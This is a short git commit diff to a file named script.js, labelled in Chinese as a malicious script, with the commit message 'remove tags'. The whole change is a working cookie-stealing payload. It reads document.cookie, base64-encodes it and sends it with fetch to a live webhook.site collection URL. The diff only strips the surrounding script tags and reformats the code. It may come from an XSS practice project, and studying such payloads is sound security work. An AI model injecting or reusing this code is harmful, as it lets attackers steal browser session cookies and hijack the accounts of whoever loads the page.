ea337796ef85d5600e4938834e66c4756b3ec84f
celik1001 <relin1001@gmail.com>
2025-04-10 15:09:32 +0800

    拿掉標籤

--- script.js
+++ script.js
@@ -1,5 +1,6 @@
 // 惡意 script
-<script>
-  var cookie = document.cookie;
-  fetch("https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?cookie="+window.btoa(cookie))
-</script>;
+var cookie = document.cookie;
+fetch(
+  "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?cookie=" +
+    window.btoa(cookie)
+);
